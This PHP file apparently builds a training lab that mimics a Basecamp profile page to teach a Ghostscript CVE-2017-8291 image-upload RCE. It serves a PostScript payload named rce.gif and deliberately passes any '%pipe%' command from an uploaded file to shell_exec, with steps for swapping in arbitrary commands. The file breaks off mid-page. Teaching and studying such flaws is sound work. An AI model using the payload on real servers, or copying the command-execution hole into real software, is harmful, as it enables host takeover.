<?php
// Lab 1103 — Basecamp RCE via ImageMagick + Ghostscript CVE-2017-8291
// HackerOne Report #365271 (Basecamp) — Reporter: gammarex — Bounty: $5,000
// Vulnerability: Profile image upload trusts file extension (.gif) without validating magic bytes.
// PostScript file (starting with %!) → ImageMagick detects PS → calls Ghostscript (libgs) →
// CVE-2017-8291 type confusion in gdevp14.c → /OutputFile (%pipe%CMD) executes shell command.

session_start();

define('FLAG', 'flag{basecamp_imagemagick_ghostscript_rce_365271}');

// ── Helpers ────────────────────────────────────────────────────────────────
function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Download sample payload endpoint ──────────────────────────────────────
if (isset($_GET['download']) && $_GET['download'] === 'payload') {
    $eps = "%!PS\n" .
           "userdict /setpagedevice undef\n" .
           "{ null restore } stopped { pop } if\n" .
           "{ legal } stopped { pop } if\n" .
           "restore\n" .
           "mark /OutputFile (%pipe%echo \$FLAG) currentdevice putdeviceprops\n";
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="rce.gif"');
    header('Content-Length: ' . strlen($eps));
    header('Cache-Control: no-cache');
    echo $eps;
    exit;
}

// ── Format detection — checks magic bytes, NOT file extension ────────────
function detect_format($content) {
    if (strlen($content) < 2) return 'unknown';
    if (substr($content, 0, 6) === 'GIF89a' || substr($content, 0, 6) === 'GIF87a') return 'gif';
    if (substr($content, 0, 4) === "\x89PNG")  return 'png';
    if (substr($content, 0, 2) === "\xFF\xD8") return 'jpeg';
    if (substr($content, 0, 2) === '%!')        return 'postscript';
    if (substr($content, 0, 4) === '%PDF')      return 'pdf';
    return 'unknown';
}

// ── Ghostscript RCE simulation (CVE-2017-8291) ────────────────────────────
function ghostscript_exec($content, &$trace) {
    $trace[] = ['type' => 'step',   'msg' => 'Parsing PostScript directives...'];

    // Primary: /OutputFile (%pipe%CMD) currentdevice putdeviceprops
    if (preg_match('/\/OutputFile\s+\(%pipe%(.+?)\)\s+currentdevice\s+putdeviceprops/s', $content, $m)) {
        $cmd_raw = trim($m[1]);
        $trace[] = ['type' => 'warn',   'msg' => 'Found: /OutputFile (%pipe%' . $cmd_raw . ') currentdevice putdeviceprops'];
        $trace[] = ['type' => 'danger', 'msg' => 'CVE-2017-8291: Type confusion in gdevp14.c — pipe to shell allowed!'];
        $trace[] = ['type' => 'exec',   'msg' => 'Executing via shell: ' . $cmd_raw];
        $cmd    = str_replace('$FLAG', FLAG, $cmd_raw);
        $output = @shell_exec($cmd . ' 2>&1');
        return ['cmd' => $cmd_raw, 'output' => $output ?: '(no output)'];
    }

    // Fallback: bare (%pipe%CMD) anywhere in document
    if (preg_match('/\(%pipe%(.+?)\)/', $content, $m)) {
        $cmd_raw = trim($m[1]);
        $trace[] = ['type' => 'warn',   'msg' => 'Found pipe expression: (%pipe%' . $cmd_raw . ')'];
        $trace[] = ['type' => 'danger', 'msg' => 'CVE-2017-8291: Ghostscript pipe execution triggered'];
        $trace[] = ['type' => 'exec',   'msg' => 'Executing via shell: ' . $cmd_raw];
        $cmd    = str_replace('$FLAG', FLAG, $cmd_raw);
        $output = @shell_exec($cmd . ' 2>&1');
        return ['cmd' => $cmd_raw, 'output' => $output ?: '(no output)'];
    }

    $trace[] = ['type' => 'info', 'msg' => 'No /OutputFile pipe directive found in PostScript document'];
    return null;
}

// ── ImageMagick pipeline simulation ───────────────────────────────────────
function imagemagick_process($filename, $content, &$trace) {
    $size   = strlen($content);
    $format = detect_format($content);
    $magic  = bin2hex(substr($content, 0, 6));

    $trace[] = ['type' => 'info', 'msg' => "Received: $filename ($size bytes)"];
    $trace[] = ['type' => 'step', 'msg' => "Reading magic bytes: 0x$magic"];

    switch ($format) {
        case 'gif':
            $trace[] = ['type' => 'ok', 'msg' => 'Detected format: GIF (valid image header)'];
            $trace[] = ['type' => 'ok', 'msg' => 'ImageMagick convert: resize to 128×128 px, strip EXIF'];
            $trace[] = ['type' => 'ok', 'msg' => 'Profile picture updated successfully'];
            return ['safe' => true, 'format' => 'gif', 'rce' => null];

        case 'png':
        case 'jpeg':
            $lbl = strtoupper($format);
            $trace[] = ['type' => 'ok', 'msg' => "Detected format: $lbl (valid image header)"];
            $trace[] = ['type' => 'ok', 'msg' => "ImageMagick convert: resize to 128×128 px"];
            $trace[] = ['type' => 'ok', 'msg' => 'Profile picture updated successfully'];
            return ['safe' => true, 'format' => $format, 'rce' => null];

        case 'postscript':
            $trace[] = ['type' => 'warn', 'msg' => "Detected format: PostScript/EPS  ← extension was .gif, magic says %!"];
            $trace[] = ['type' => 'warn', 'msg' => 'VULNERABILITY: No magic-byte validation — extension (.gif) trusted blindly'];
            $trace[] = ['type' => 'step', 'msg' => "ImageMagick identify: PS/EPS document → routing to libgs (Ghostscript 9.18)..."];
            $rce = ghostscript_exec($content, $trace);
            return ['safe' => false, 'format' => 'postscript', 'rce' => $rce];

        case 'pdf':
            $trace[] = ['type' => 'warn', 'msg' => 'Detected format: PDF — also processed by Ghostscript'];
            $trace[] = ['type' => 'step', 'msg' => 'ImageMagick → libgs → processing PDF...'];
            $rce = ghostscript_exec($content, $trace);
            return ['safe' => false, 'format' => 'pdf', 'rce' => $rce];

        default:
            $trace[] = ['type' => 'err', 'msg' => "Detected format: UNKNOWN (magic: 0x$magic)"];
            $trace[] = ['type' => 'err', 'msg' => 'ImageMagick: unable to decode image — aborting'];
            return ['safe' => false, 'format' => 'unknown', 'rce' => null];
    }
}

// ── MySQL ──────────────────────────────────────────────────────────────────
$db = new mysqli('localhost', 'root', '', 'KrazePlanetLabs_DB');
if ($db->connect_error) die('<p style="padding:32px;font-family:sans-serif">DB error: ' . esc($db->connect_error) . '</p>');

$db->query("CREATE TABLE IF NOT EXISTS lab1103_uploads (
    id                INT AUTO_INCREMENT PRIMARY KEY,
    original_filename VARCHAR(255),
    file_size         INT,
    detected_format   VARCHAR(32),
    is_postscript     TINYINT(1) DEFAULT 0,
    ps_content        TEXT,
    cmd_extracted     TEXT,
    cmd_output        TEXT,
    uploaded_at       DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// ── POST handlers ──────────────────────────────────────────────────────────
$action_msg = '';
$trace      = [];
$result     = null;
$ps_content = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'upload_avatar') {
        if (empty($_FILES['avatar']['tmp_name']) || $_FILES['avatar']['error'] !== UPLOAD_ERR_OK) {
            $action_msg = 'No file received or upload error.';
        } else {
            $filename = basename($_FILES['avatar']['name'] ?? 'upload.gif');
            $content  = file_get_contents($_FILES['avatar']['tmp_name']);

            $result = imagemagick_process($filename, $content, $trace);

            $is_ps     = $result['format'] === 'postscript' || $result['format'] === 'pdf' ? 1 : 0;
            $ps_store  = $is_ps ? substr($content, 0, 4096) : null;
            $cmd_ext   = $result['rce']['cmd'] ?? null;
            $cmd_out   = $result['rce']['output'] ?? null;
            $fsize     = strlen($content);

            $ins = $db->prepare("INSERT INTO lab1103_uploads
                (original_filename, file_size, detected_format, is_postscript, ps_content, cmd_extracted, cmd_output)
                VALUES (?,?,?,?,?,?,?)");
            $ins->bind_param('sisisss', $filename, $fsize, $result['format'], $is_ps, $ps_store, $cmd_ext, $cmd_out);
            $ins->execute();
            $ins->close();

            if ($result['safe']) {
                $action_msg = 'Profile picture updated successfully!';
            } elseif ($result['rce']) {
                $action_msg = 'PostScript file processed — command executed.';
            } else {
                $action_msg = 'Upload failed: ' . $result['format'] . ' format rejected.';
            }
        }
    }

    elseif ($action === 'clear_log') {
        $db->query("DELETE FROM lab1103_uploads");
        $action_msg = 'Upload log cleared.';
    }
}

$last_upload   = $db->query("SELECT * FROM lab1103_uploads ORDER BY id DESC LIMIT 1")->fetch_assoc();
$upload_count  = $db->query("SELECT COUNT(*) c FROM lab1103_uploads")->fetch_assoc()['c'];
$rce_count     = $db->query("SELECT COUNT(*) c FROM lab1103_uploads WHERE is_postscript=1")->fetch_assoc()['c'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>My profile — Basecamp</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#F4F2EE;color:#1D2630;font-size:14px;min-height:100vh;display:flex;flex-direction:column;}

/* ── Top nav ─────────────────────────────────────────────────────────────── */
.bc-nav{background:#1D2F23;height:52px;display:flex;align-items:center;padding:0 20px;gap:16px;position:sticky;top:0;z-index:200;flex-shrink:0;}
.bc-logo{display:flex;align-items:center;gap:9px;text-decoration:none;color:#fff;flex-shrink:0;}
.bc-logo-icon{width:28px;height:28px;flex-shrink:0;}
.bc-logo-text{font-size:.95rem;font-weight:800;letter-spacing:-.01em;color:#fff;}
.bc-nav-link{color:rgba(255,255,255,.65);text-decoration:none;font-size:.8rem;padding:5px 10px;border-radius:4px;transition:all .15s;}
.bc-nav-link:hover{color:#fff;background:rgba(255,255,255,.1);}
.bc-nav-right{margin-left:auto;display:flex;align-items:center;gap:12px;}
.bc-user-pill{display:flex;align-items:center;gap:8px;color:#fff;font-size:.8rem;cursor:pointer;}
.bc-user-av{width:28px;height:28px;border-radius:50%;background:#2AB05B;display:flex;align-items:center;justify-content:center;font-size:.68rem;font-weight:800;color:#fff;flex-shrink:0;}

/* ── Shell ───────────────────────────────────────────────────────────────── */
.bc-shell{display:flex;flex:1;overflow:hidden;}

/* ── Sidebar ─────────────────────────────────────────────────────────────── */
.bc-sidebar{width:220px;background:#fff;border-right:1px solid #E2DED6;padding:20px 0;flex-shrink:0;overflow-y:auto;}
.bc-sb-section{margin-bottom:20px;}
.bc-sb-title{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#8C8782;padding:0 18px 6px;}
.bc-sb-link{display:block;padding:7px 18px;font-size:.82rem;color:#3D3D3D;text-decoration:none;border-radius:4px;margin:1px 8px;transition:all .12s;}
.bc-sb-link:hover{background:#F4F2EE;}
.bc-sb-link.active{background:#E3F5EB;color:#146B37;font-weight:600;}
.bc-sb-link.danger{color:#D93025;}

/* ── Main ────────────────────────────────────────────────────────────────── */
.bc-main{flex:1;padding:28px 32px 48px;overflow-y:auto;}
.bc-crumb{font-size:.76rem;color:#8C8782;margin-bottom:18px;display:flex;align-items:center;gap:5px;}
.bc-crumb a{color:#2AB05B;text-decoration:none;}
.bc-crumb a:hover{text-decoration:underline;}
.bc-crumb .sep{color:#C8C4BC;}
.bc-page-title{font-size:1.3rem;font-weight:800;color:#1D2630;margin-bottom:24px;}

/* ── Cards ───────────────────────────────────────────────────────────────── */
.bc-card{background:#fff;border:1px solid #E2DED6;border-radius:8px;margin-bottom:18px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.06);}
.bc-card-hd{padding:14px 20px;border-bottom:1px solid #E2DED6;display:flex;align-items:center;justify-content:space-between;gap:10px;}
.bc-card-title{font-size:.88rem;font-weight:700;color:#1D2630;display:flex;align-items:center;gap:7px;}
.bc-card-title svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;}
.bc-card-body{padding:20px;}

/* ── Avatar ──────────────────────────────────────────────────────────────── */
.avatar-section{display:flex;align-items:flex-start;gap:20px;margin-bottom:22px;padding-bottom:22px;border-bottom:1px solid #F0EDE8;}
.avatar-wrap{position:relative;flex-shrink:0;}
.avatar-circle{width:92px;height:92px;border-radius:50%;background:linear-gradient(135deg,#2AB05B,#146B37);display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:800;color:#fff;cursor:pointer;border:3px solid #E2DED6;transition:border-color .15s;overflow:hidden;user-select:none;}
.avatar-circle:hover{border-color:#2AB05B;}
.avatar-overlay{position:absolute;inset:0;border-radius:50%;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .15s;cursor:pointer;font-size:.68rem;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.06em;}
.avatar-wrap:hover .avatar-overlay{opacity:1;}
.avatar-info h3{font-size:.92rem;font-weight:700;color:#1D2630;margin-bottom:3px;}
.avatar-info .role{font-size:.78rem;color:#8C8782;margin-bottom:10px;}
.avatar-info .hint{font-size:.72rem;color:#8C8782;line-height:1.5;margin-bottom:10px;}
.avatar-btns{display:flex;gap:8px;flex-wrap:wrap;}

/* ── Form ────────────────────────────────────────────────────────────────── */
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px;}
.form-group{margin-bottom:14px;}
.form-label{display:block;font-size:.76rem;font-weight:600;color:#1D2630;margin-bottom:4px;}
.form-control{width:100%;border:1px solid #C8C4BC;border-radius:5px;padding:8px 10px;font-size:.82rem;font-family:inherit;background:#FAFAF8;color:#1D2630;outline:none;transition:border-color .15s;}
.form-control:focus{border-color:#2AB05B;box-shadow:0 0 0 2px rgba(42,176,91,.15);background:#fff;}
.form-control[readonly]{background:#F4F2EE;color:#8C8782;cursor:default;}

/* ── Buttons ─────────────────────────────────────────────────────────────── */
.bc-btn{display:inline-flex;align-items:center;gap:6px;border:none;border-radius:5px;padding:8px 16px;font-size:.8rem;font-weight:700;cursor:pointer;font-family:inherit;transition:all .15s;text-decoration:none;}
.bc-btn svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0;}
.bc-btn-primary{background:#2AB05B;color:#fff;}
.bc-btn-primary:hover{background:#239B4F;}
.bc-btn-primary:disabled{background:#A8DFC0;cursor:not-allowed;opacity:.7;}
.bc-btn-danger{background:#D93025;color:#fff;}
.bc-btn-danger:hover{background:#B82820;}
.bc-btn-ghost{background:#fff;color:#3D3D3D;border:1px solid #C8C4BC;}
.bc-btn-ghost:hover{background:#F4F2EE;border-color:#8C8782;}
.bc-btn-sm{padding:5px 11px;font-size:.74rem;}
.bc-btn-xs{padding:3px 9px;font-size:.68rem;}

/* ── Badges ──────────────────────────────────────────────────────────────── */
.bc-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 7px;border-radius:3px;font-size:.64rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;}
.badge-safe{background:#E3F5EB;color:#146B37;border:1px solid #A8DFC0;}
.badge-rce{background:#FEE2E2;color:#991B1B;border:1px solid #FCA5A5;animation:pulse-rce 1.5s infinite;}
.badge-warn{background:#FEF3C7;color:#92400E;border:1px solid #FCD34D;}
.badge-info{background:#EFF6FF;color:#1E40AF;border:1px solid #BFDBFE;}
@keyframes pulse-rce{0%,100%{box-shadow:0 0 0 0 rgba(220,38,38,.3);}50%{box-shadow:0 0 0 5px rgba(220,38,38,.05);}}

/* ── Alerts ──────────────────────────────────────────────────────────────── */
.bc-alert{padding:10px 14px;border-radius:5px;font-size:.8rem;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
.bc-alert-success{background:#E3F5EB;border:1px solid #A8DFC0;color:#146B37;}
.bc-alert-danger{background:#FEE2E2;border:1px solid #FCA5A5;color:#991B1B;}
.bc-alert-warn{background:#FEF3C7;border:1px solid #FCD34D;color:#92400E;}
.bc-alert-info{background:#EFF6FF;border:1px solid #BFDBFE;color:#1E40AF;}

/* ── Processing log ──────────────────────────────────────────────────────── */
.proc-terminal{background:#1A1A1A;border-radius:6px;overflow:hidden;border:1px solid #2D2D2D;}
.proc-term-bar{background:#2D2D2D;padding:8px 14px;display:flex;align-items:center;gap:7px;}
.t-dot{width:10px;height:10px;border-radius:50%;}
.t-dot-r{background:#FF5F57;}
.t-dot-y{background:#FFBD2E;}
.t-dot-g{background:#28C840;}
.proc-term-bar .t-label{font-size:.7rem;color:#7A7A7A;margin-left:8px;font-family:'Courier New',monospace;}
.proc-term-body{padding:14px 16px;font-family:'Courier New',monospace;font-size:.75rem;line-height:1.9;max-height:400px;overflow-y:auto;}
.t-info{color:#7A7A7A;}
.t-step{color:#5DB8F5;}
.t-ok{color:#28C840;}
.t-warn{color:#FFBD2E;}
.t-danger{color:#FF5F57;font-weight:700;}
.t-exec{color:#CF9FFF;}
.t-err{color:#FF5F57;}
.rce-out-box{background:#0A0A0A;border:1px solid #6B2FA0;border-radius:4px;padding:12px 14px;margin-top:10px;font-family:'Courier New',monospace;font-size:.75rem;color:#E0CFFF;white-space:pre-wrap;word-break:break-all;}
.rce-out-lbl{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#7A7A7A;margin-bottom:5px;}

/* ── Attack reference ────────────────────────────────────────────────────── */
.atk-card{background:#1D2630;border:1px solid #2E3D4E;border-radius:8px;padding:16px;margin-bottom:16px;}
.atk-card-title{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#5D7898;margin-bottom:12px;display:flex;align-items:center;gap:6px;}
.atk-card-title svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2;}
.eps-code{background:#0D1520;border:1px solid #2E3D4E;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:.72rem;line-height:1.8;overflow-x:auto;white-space:pre;color:#8CC8D0;}
.eps-hi-magic{color:#F87171;font-weight:700;}
.eps-hi-dir{color:#F5A700;}
.eps-hi-pipe{color:#CF9FFF;}
.eps-hi-cmd{color:#3AC97B;font-weight:700;}
.eps-comment{color:#4A6480;}
.atk-step{display:flex;gap:8px;align-items:baseline;margin-bottom:8px;font-size:.78rem;}
.atk-step-num{background:#2AB05B;color:#fff;padding:1px 6px;border-radius:10px;font-size:.63rem;font-weight:700;flex-shrink:0;}
.atk-step span{color:#DFE5EF;line-height:1.5;}
.atk-step code{color:#A8CC88;font-size:.72rem;}

/* ── Report meta ─────────────────────────────────────────────────────────── */
.report-meta{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
.rm-lbl{font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#5D7898;margin-bottom:2px;}
.rm-val{font-size:.76rem;font-weight:600;color:#DFE5EF;}
.rm-val a{color:#2AB05B;text-decoration:none;}
.rm-val a:hover{text-decoration:underline;}
.sev-c{background:#3B0000;color:#FCA5A5;border:1px solid #7F1D1D;padding:1px 6px;border-radius:3px;font-size:.67rem;font-weight:700;}

/* ── Mitigation ──────────────────────────────────────────────────────────── */
.fix-code{background:#0D1520;border:1px solid #2E3D4E;border-radius:4px;padding:10px;font-family:'Courier New',monospace;font-size:.7rem;color:#A8CC88;line-height:1.7;overflow-x:auto;white-space:pre;}
.fix-comment{color:#4A6480;}

/* ── Two-column layout ───────────────────────────────────────────────────── */
.two-col{display:grid;grid-template-columns:1fr 300px;gap:20px;align-items:start;}
@media(max-width:880px){.two-col{grid-template-columns:1fr;}}

/* ── Upload history table ────────────────────────────────────────────────── */
.hist-table{width:100%;border-collapse:collapse;font-size:.76rem;}
.hist-table th{background:#F4F2EE;color:#8C8782;font-weight:700;text-transform:uppercase;font-size:.62rem;letter-spacing:.05em;padding:7px 10px;text-align:left;border-bottom:1px solid #E2DED6;}
.hist-table td{padding:8px 10px;border-bottom:1px solid #F0EDE8;vertical-align:middle;}
.hist-table tr:last-child td{border-bottom:none;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
footer{background:#1D2F23;padding:12px 24px;font-size:.7rem;color:rgba(255,255,255,.45);display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;flex-shrink:0;}
footer a{color:rgba(255,255,255,.45);text-decoration:none;}
footer a:hover{color:#2AB05B;}
</style>
</head>
<body>

<!-- Top nav -->
<nav class="bc-nav">
  <a href="1103.php" class="bc-logo">
    <svg class="bc-logo-icon" viewBox="0 0 28 28">
      <rect width="28" height="28" rx="6" fill="#2AB05B"/>
      <path d="M14 5L24 20H4Z" fill="white" fill-opacity=".95"/>
      <path d="M14 11L20 20H8Z" fill="#1D2F23" fill-opacity=".75"/>
    </svg>
    <span class="bc-logo-text">Basecamp</span>
  </a>
  <a href="#" class="bc-nav-link">Home</a>
  <a href="#" class="bc-nav-link">My stuff</a>
  <a href="#" class="bc-nav-link">Projects</a>
  <a href="#" class="bc-nav-link">People</a>
  <div class="bc-nav-right">
    <a href="1103.php?download=payload" class="bc-btn bc-btn-ghost bc-btn-sm" style="font-size:.7rem;color:rgba(255,255,255,.75);background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.2);">
      <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
      Download rce.gif
    </a>
    <div class="bc-user-pill">
      <div class="bc-user-av">JF</div>
      <span>Jason Fried</span>
    </div>
  </div>
</nav>

<div class="bc-shell">

  <!-- Left sidebar -->
  <aside class="bc-sidebar">
    <div class="bc-sb-section">
      <div class="bc-sb-title">My account</div>
      <a href="#" class="bc-sb-link active">My profile</a>
      <a href="#" class="bc-sb-link">Password &amp; security</a>
      <a href="#" class="bc-sb-link">Connected devices</a>
      <a href="#" class="bc-sb-link">Two-factor auth</a>
    </div>
    <div class="bc-sb-section">
      <div class="bc-sb-title">Notifications</div>
      <a href="#" class="bc-sb-link">Notification settings</a>
      <a href="#" class="bc-sb-link">Email preferences</a>
      <a href="#" class="bc-sb-link">Do not disturb</a>
    </div>
    <div class="bc-sb-section">
      <div class="bc-sb-title">Other</div>
      <a href="#" class="bc-sb-link">Appearance</a>
      <a href="#" class="bc-sb-link">Keyboard shortcuts</a>
      <a href="#" class="bc-sb-link danger">Log out</a>
    </div>
  </aside>

  <!-- Main content -->
  <main class="bc-main">
    <div class="bc-crumb">
      <a href="#">My stuff</a>
      <span class="sep">›</span>
      <a href="#">Account settings</a>
      <span class="sep">›</span>
      <span>My profile</span>
    </div>
    <div class="bc-page-title">My profile</div>

    <?php if ($action_msg): ?>
    <div class="bc-alert <?= $result && !$result['safe'] ? 'bc-alert-danger' : ($result ? 'bc-alert-success' : 'bc-alert-info') ?>">
      <?= esc($action_msg) ?>
    </div>
    <?php endif; ?>

    <div class="two-col">

      <!-- Left column -->
      <div>

        <!-- Profile & picture card -->
        <div class="bc-card">
          <div class="bc-card-hd">
            <div class="bc-card-title">
              <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
              Profile &amp; picture
            </div>
            <div style="display:flex;align-items:center;gap:8px;">
              <span style="font-size:.72rem;color:#8C8782;"><?= $upload_count ?> upload(s)</span>
              <?php if ($rce_count > 0): ?>
              <span class="bc-badge badge-rce">⚡ <?= $rce_count ?> RCE</span>
              <?php endif; ?>
            </div>
          </div>
          <div class="bc-card-body">

            <!-- Avatar upload -->
            <div class="avatar-section">
              <div class="avatar-wrap">
                <div class="avatar-circle" onclick="document.getElementById('avatarInput').click()">
                  <?php if ($result && $result['safe']): ?>
                  <svg style="width:40px;height:40px;stroke:#fff;fill:none;stroke-width:1.5;" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                  <?php else: ?>
                  JF
                  <?php endif; ?>
                </div>
                <div class="avatar-overlay" onclick="document.getElementById('avatarInput').click()">Edit</div>
              </div>
              <div class="avatar-info">
                <h3>Jason Fried</h3>
                <div class="role">CEO &amp; Co-founder, Basecamp</div>
                <div class="hint">Upload a profile picture. Accepted file types: .gif, .jpg, .png — processed by ImageMagick.</div>
                <div class="avatar-btns">
                  <form method="POST" action="1103.php" enctype="multipart/form-data" id="avatarForm">
                    <input type="hidden" name="action" value="upload_avatar">
                    <input type="file" id="avatarInput" name="avatar" accept=".gif,.jpg,.jpeg,.png"
                      style="display:none;" onchange="document.getElementById('avatarForm').submit()">
                    <button type="button" class="bc-btn bc-btn-ghost bc-btn-sm"
                      onclick="document.getElementById('avatarInput').click()">
                      <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>
                      Change picture
                    </button>
                  </form>
                  <a href="1103.php?download=payload" class="bc-btn bc-btn-ghost bc-btn-sm">
                    <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
                    Download rce.gif
                  </a>
                </div>
              </div>
            </div>

            <!-- Profile form (cosmetic) -->
            <div class="form-row">
              <div class="form-group" style="margin:0;">
                <label class="form-label">First name</label>
                <input type="text" class="form-control" value="Jason" readonly>
              </div>
              <div class="form-group" style="margin:0;">
                <label class="form-label">Last name</label>
                <input type="text" class="form-control" value="Fried" readonly>
              </div>
            </div>
            <div class="form-group">
              <label class="form-label">Email address</label>
              <input type="email" class="form-control" value="jason@basecamp.com" readonly>
            </div>
            <div class="form-group">
              <label class="form-label">Title / Role</label>
              <input type="text" class="form-control" value="CEO &amp; Co-founder" readonly>
            </div>
            <div class="form-group">
              <label class="form-label">Bio (optional)</label>
              <textarea class="form-control" rows="3" readonly>Making software &amp; bootstrapping companies. Founder &amp; CEO of Basecamp. Co-author of "Getting Real", "Rework", and "Remote".</textarea>
            </div>
            <button class="bc-btn bc-btn-primary" disabled>Save changes</button>
          </div>
        </div>

        <!-- Processing log (current request trace) -->
        <?php if (!empty($trace)): ?>
        <div class="bc-card">
          <div class="bc-card-hd">
            <div class="bc-card-title">
              <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
              ImageMagick Processing Log
            </div>
            <div style="display:flex;align-items:center;gap:7px;">
              <?php if ($result && !$result['safe'] && $result['rce']): ?>
              <span class="bc-badge badge-rce">⚡ RCE EXECUTED</span>
              <?php elseif ($result && $result['safe']): ?>
              <span class="bc-badge badge-safe">✓ Safe</span>
              <?php else: ?>
              <span class="bc-badge badge-warn">⚠ Rejected</span>
              <?php endif; ?>
            </div>
          </div>
          <div class="bc-card-body" style="padding:14px;">
            <div class="proc-terminal">
              <div class="proc-term-bar">
                <span class="t-dot t-dot-r"></span>
                <span class="t-dot t-dot-y"></span>
                <span class="t-dot t-dot-g"></span>
                <span class="t-label">imagemagick-processing · libgs 9.18</span>
              </div>
              <div class="proc-term-body">
                <?php foreach ($trace as $t): ?>
                <?php
                $cls  = 't-' . ($t['type'] ?? 'info');
                $pref = match($t['type'] ?? 'info') {
                    'step'   => '→ ',
                    'ok'     => '✓ ',
                    'warn'   => '⚠ ',
                    'danger' => '⚡ ',
                    'exec'   => '$ ',
                    'err'    => '✗ ',
                    default  => '  ',
                };
                ?>
                <div class="<?= esc($cls) ?>"><?= esc($pref . $t['msg']) ?></div>
                <?php endforeach; ?>

                <?php if ($result && !$result['safe'] && $result['rce']): ?>
                <div class="t-danger" style="margin-top:6px;">⚡ Shell command output captured:</div>
                <?php endif; ?>
              </div>
            </div>

            <?php if ($result && $result['rce']): ?>
            <div class="rce-out-box">
              <div class="rce-out-lbl">Command output — <?= esc($result['rce']['cmd']) ?></div><?= esc($result['rce']['output']) ?></div>
            <?php endif; ?>
          </div>
        </div>

        <?php elseif ($last_upload): ?>
        <div class="bc-card">
          <div class="bc-card-hd">
            <div class="bc-card-title">
              <svg viewBox="0 0 24 24"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
              Last Upload
            </div>
          </div>
          <div class="bc-card-body">
            <div style="font-size:.8rem;color:#8C8782;display:flex;gap:16px;flex-wrap:wrap;">
              <span><strong style="color:#1D2630;"><?= esc($last_upload['original_filename']) ?></strong></span>
              <span>Format: <strong><?= esc($last_upload['detected_format']) ?></strong></span>
              <span>Size: <?= number_format((int)$last_upload['file_size']) ?> B</span>
              <?php if ($last_upload['is_postscript']): ?>
              <span class="bc-badge badge-rce">RCE</span>
              <span style="color:#991B1B;font-size:.76rem;">cmd: <code><?= esc(mb_substr($last_upload['cmd_extracted'] ?? '', 0, 60)) ?></code></span>
              <?php else: ?>
              <span class="bc-badge badge-safe">Safe</span>
              <?php endif; ?>
              <span style="color:#C8C4BC;">at <?= esc($last_upload['uploaded_at']) ?></span>
            </div>
            <?php if ($last_upload['cmd_output']): ?>
            <div class="rce-out-box" style="margin-top:10px;">
              <div class="rce-out-lbl">Previous RCE output</div><?= esc(mb_substr($last_upload['cmd_output'], 0, 400)) ?></div>
            <?php endif; ?>
          </div>
        </div>
        <?php endif; ?>

        <!-- Clear log button -->
        <?php if ($upload_count > 0): ?>
        <form method="POST" style="text-align:right;margin-top:-8px;">
          <input type="hidden" name="action" value="clear_log">
          <button type="submit" class="bc-btn bc-btn-ghost bc-btn-sm" style="color:#D93025;border-color:#FCA5A5;">
            Clear upload log
          </button>
        </form>
        <?php endif; ?>

      </div><!-- /left col -->

      <!-- Right column: attack reference -->
      <div>

        <div class="atk-card">
          <div class="atk-card-title">
            <svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
            Attack Flow
          </div>
          <div class="atk-step">
            <span class="atk-step-num">1</span>
            <span>Click <strong style="color:#DFE5EF;">Download rce.gif</strong> to get the sample PostScript payload</span>
          </div>
          <div class="atk-step">
            <span class="atk-step-num">2</span>
            <span>Edit the file — change <code>echo $FLAG</code> to any shell command</span>
          </div>
          <div class="atk-step">
            <span class="atk-step-num">3</span>
            <span>Click <strong style="color:#DFE5EF;">Change picture</strong> and upload <code>rce.gif</code></span>
          </div>
          <div class="atk-step">
            <span class="atk-step-num">4</span>
            <span>ImageMagick detects <code>%!</code> magic → calls Ghostscript → CVE-2017-8291 fires → shell output shown below</span>
          </div>
        </div>

        <div class="atk-card">
          <div class="atk-card-title">
            <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
